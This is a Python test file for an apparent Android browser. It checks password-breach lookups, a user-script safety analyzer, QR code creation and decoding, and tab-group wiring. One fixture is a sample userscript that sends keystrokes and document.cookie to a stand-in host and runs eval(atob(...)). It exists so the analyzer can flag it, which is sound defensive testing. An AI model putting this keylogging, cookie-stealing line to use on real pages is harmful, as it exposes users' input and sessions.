"""Android: Safety Check logic, QR creation/decoding and tab groups. Java logic runs on a plain JVM; QR images are decoded with jsQR in Chromium."""
import base64, json, os, shutil, subprocess, tempfile, unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
MAIN = os.path.join(ROOT, "android", "app", "src", "main")
JAVA = os.path.join(MAIN, "java")
PKG = os.path.join(JAVA, "com", "spscompany", "spsbrowser")
JSQR = os.path.join(MAIN, "assets", "jsQR.js")

STUBS = {
    "org/json/JSONObject.java": """package org.json; import java.util.*;
public class JSONObject { Map<String,String> m = new HashMap<>(); public JSONObject(String... kv){ for(int i=0;i+1<kv.length;i+=2) m.put(kv[i],kv[i+1]); }
 public JSONObject(String s) throws Exception {} public String optString(String k){ return m.containsKey(k)?m.get(k):""; } public String optString(String k,String d){ return m.containsKey(k)?m.get(k):d; }
 public boolean optBoolean(String k){return false;} public JSONArray optJSONArray(String k){return null;} public long optLong(String k){return 0;} }""",
    "org/json/JSONArray.java": "package org.json; public class JSONArray { public int length(){return 0;} public JSONObject getJSONObject(int i) throws Exception {return null;} }",
    "android/graphics/Color.java": "package android.graphics; public class Color { public static final int WHITE=0xFFFFFFFF, BLACK=0xFF000000; }",
    "android/graphics/Bitmap.java": "package android.graphics; public class Bitmap { public enum Config { ARGB_8888 } public static Bitmap createBitmap(int w,int h,Config c){return new Bitmap();} public void eraseColor(int c){} public void setPixel(int x,int y,int c){} }",
}

T = r"""package com.spscompany.spsbrowser;
import org.json.JSONObject; import java.util.*;
public class T { static void ok(boolean b, String m){ if(!b) throw new RuntimeException(m); }
 static JSONObject L(String h, String p){ return new JSONObject("h", h, "p", p); }
 public static void main(String[] a) throws Exception {
  String[] sp = Safety.sha1Parts("password"); ok(sp[0].equals("5BAA6") && sp[1].equals("1E4C9B93F3F0682250B6CF8331B7EE68FD8"), "sha1");
  final List<String> asked = new ArrayList<>();
  Safety.Fetch f = u -> { asked.add(u); return u.endsWith("5BAA6") ? "0018A45C4D1DEF81644B54AB7F969B88D65:3\r\n1E4C9B93F3F0682250B6CF8331B7EE68FD8:9545824\r\n" : "AAAAA:1"; };
  ok(Safety.pwnedCount("password", f, new HashMap<>()) == 9545824, "count");
  ok(asked.size()==1 && asked.get(0).equals(Safety.HIBP + "5BAA6"), "only 5 chars are sent: " + asked);
  asked.clear();
  List<Safety.Result> r = Safety.checkPasswords(Arrays.asList(L("a.com","password"), L("b.com","Xk9#vLq2!pZr"), L("c.com","Reused!Pass99"), L("d.com","Reused!Pass99"), L("e.com","abc")), f);
  boolean leak=false, reuse=false, weak=false;
  for (Safety.Result x : r) { if (x.title.startsWith("Password found")) leak=true; if (x.title.equals("Reused password")) reuse=true; if (x.title.equals("Weak password")) weak=true;
     ok(!x.detail.contains("Xk9#vLq2") && !x.detail.contains("Reused!Pass99"), "password in report"); }
  ok(leak && reuse && weak, "findings");
  for (String u : asked) ok(u.length() == Safety.HIBP.length() + 5, "url only has the prefix");
  List<Safety.Result> off = Safety.checkPasswords(Arrays.asList(L("a.com","Xk9#vLq2!pZr")), u -> { throw new java.io.IOException("offline"); });
  ok(off.get(0).level.equals(Safety.INFO), "offline is info, not a crash");
  ok(Safety.checkPasswords(new ArrayList<>(), f).get(0).level.equals(Safety.INFO), "empty");
  ok(Safety.analyzeScript("dark", "*://example.com/*", "document.body.style.background='#111'") == null, "benign");
  Safety.Result bad = Safety.analyzeScript("x", "*", "document.addEventListener('keydown',e=>fetch('https://x/k?'+e.key+document.cookie)); eval(atob('YQ=='))");
  ok(bad != null && bad.level.equals(Safety.BAD), "stealer");
  ok(Safety.checkVersion("1.0.0", "2.0.0").level.equals(Safety.WARN), "newer exists");
  ok(Safety.checkVersion("2.0.0", "2.0.0").level.equals(Safety.OK), "same");
  ok(Safety.checkVersion("2.0.0", null).level.equals(Safety.INFO), "unknown");
  ok(Qr.isWebLink("https://a.b/c") && !Qr.isWebLink("javascript:alert(1)") && !Qr.isWebLink("https://a b") && !Qr.isWebLink("intent://x"), "web link only");
  if (a.length > 3 && a[0].equals("PAGE")) {
    String js = new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(a[1])), "UTF-8");
    String b64 = new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(a[2])), "UTF-8").trim();
    java.nio.file.Files.write(java.nio.file.Paths.get(a[3]), Qr.decodePage(js, b64).getBytes("UTF-8"));
    System.out.println("SAFETY OK"); return; }
  boolean[][] m = Qr.modules(a.length > 0 ? a[0] : "https://example.com/");
  StringBuilder sb = new StringBuilder("QR:");
  for (boolean[] row : m) { for (boolean v : row) sb.append(v ? '1' : '0'); sb.append('/'); }
  System.out.println(sb);
  System.out.println("SAFETY OK"); } }"""


@unittest.skipUnless(shutil.which("javac") and shutil.which("java"), "no JDK")
class SafetyAndQrJvmTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        d = cls.d = tempfile.mkdtemp()
        srcs = []
        for rel, text in STUBS.items():
            p = os.path.join(d, "src", rel); os.makedirs(os.path.dirname(p), exist_ok=True); open(p, "w").write(text); srcs.append(p)
        pk = os.path.join(d, "src", "com", "spscompany", "spsbrowser"); os.makedirs(pk, exist_ok=True)
        for f in ("Safety.java", "Qr.java", "Updater.java"):
            shutil.copy(os.path.join(PKG, f), pk); srcs.append(os.path.join(pk, f))
        open(os.path.join(pk, "T.java"), "w").write(T); srcs.append(os.path.join(pk, "T.java"))
        qd = os.path.join(JAVA, "io", "nayuki", "qrcodegen")
        for f in os.listdir(qd):
            if f.endswith(".java"): srcs.append(os.path.join(qd, f))
        out = os.path.join(d, "out"); os.makedirs(out)
        r = subprocess.run(["javac", "-d", out] + srcs, capture_output=True, text=True)
        assert r.returncode == 0, r.stderr
        cls.out = out

    def run_t(self, *args):
        r = subprocess.run(["java", "-cp", self.out, "com.spscompany.spsbrowser.T", *args], capture_output=True, text=True)
        self.assertIn("SAFETY OK", r.stdout + r.stderr, r.stderr)
        return r.stdout

    def test_safety_logic(self):
        self.run_t()

    def test_java_qr_is_scannable(self):
        try:
            from playwright.sync_api import sync_playwright
        except Exception:
            self.skipTest("playwright missing")
        texts = ["https://example.com/", "https://www.youtube.com/watch?v=dQw4w9WgXcQ&t=42s"]
        with sync_playwright() as p:
            b = p.chromium.launch(); pg = b.new_page(); pg.set_content("<canvas id=c></canvas>"); pg.add_script_tag(path=JSQR)
            for t in texts:
                line = [l for l in self.run_t(t).splitlines() if l.startswith("QR:")][0][3:]
                rows = [r for r in line.split("/") if r]
                got = pg.evaluate("""(rows) => { const n = rows.length, cell = 8, br = 4, W = (n + 2*br) * cell; const c = document.getElementById('c'); c.width = W; c.height = W;
                    const x = c.getContext('2d'); x.fillStyle = '#fff'; x.fillRect(0,0,W,W); x.fillStyle = '#000';
                    rows.forEach((r, y) => [...r].forEach((v, i) => { if (v === '1') x.fillRect((i+br)*cell, (y+br)*cell, cell, cell); }));
                    const r = jsQR(x.getImageData(0,0,W,W).data, W, W); return r ? r.data : null; }""", rows)
                self.assertEqual(got, t)
            # the decode page used by the app, fed a real JPEG of a QR code
            line = [l for l in self.run_t("https://www.example.org/path?a=1").splitlines() if l.startswith("QR:")][0][3:]
            rows = [r for r in line.split("/") if r]
            jpeg = pg.evaluate("""(rows) => { const n = rows.length, cell = 6, br = 4, W = (n + 2*br) * cell; const c = document.createElement('canvas'); c.width = W; c.height = W;
                const x = c.getContext('2d'); x.fillStyle = '#fff'; x.fillRect(0,0,W,W); x.fillStyle = '#000';
                rows.forEach((r, y) => [...r].forEach((v, i) => { if (v === '1') x.fillRect((i+br)*cell, (y+br)*cell, cell, cell); }));
                return c.toDataURL('image/jpeg', 0.85).split(',')[1]; }""", rows)
            tmp = tempfile.mkdtemp(); pj = os.path.join(tmp, "j.txt"); pb = os.path.join(tmp, "b.txt"); ph = os.path.join(tmp, "page.html")
            open(pb, "w").write(jpeg); open(pj, "w", encoding="utf-8").write(open(JSQR, encoding="utf-8").read())
            self.run_t("PAGE", pj, pb, ph)                      # the page is built by the REAL Qr.decodePage
            html = open(ph, encoding="utf-8").read()
            self.assertIn("SPSQR.result", html)
            pg2 = b.new_page()
            pg2.set_content(html.replace("<html><body>", "<html><body><script>window.__r=null;window.SPSQR={result:function(t){window.__r=t;}};</script>", 1))
            pg2.wait_for_function("window.__r !== null", timeout=15000)
            self.assertEqual(pg2.evaluate("window.__r"), "https://www.example.org/path?a=1")
            b.close()


class TabGroupAndWiringTests(unittest.TestCase):
    def test_tab_groups_wired(self):
        tp = open(os.path.join(PKG, "TabsPage.java"), encoding="utf-8").read()
        bt = open(os.path.join(PKG, "BTab.java"), encoding="utf-8").read()
        self.assertIn("String group;", bt)
        for needle in ("groupHeader(", "groupDialog(", "groupMenu(", "collapsed", "askGroupName(", 'action("Group"', "Add to group"):
            self.assertIn(needle, tp)
        for needle in ("private void buildHeader", "private void buildBottom", "private View gridCard", "private View listRow", "private void render()"):
            self.assertIn(needle, tp)                  # nothing else was lost while editing

    def test_new_features_in_menus(self):
        m = open(os.path.join(PKG, "MainActivity.java"), encoding="utf-8").read()
        for needle in ("this::showSafetyCheck", "this::startQrScan", "this::sendCurrentTabQr", "this::shareAllTabs", "this::openLinksFromClipboard"):
            self.assertIn(needle, m)
        self.assertTrue(os.path.isfile(JSQR))
        self.assertTrue(os.path.isfile(os.path.join(JAVA, "io", "nayuki", "qrcodegen", "QrCode.java")))


if __name__ == "__main__":
    unittest.main()
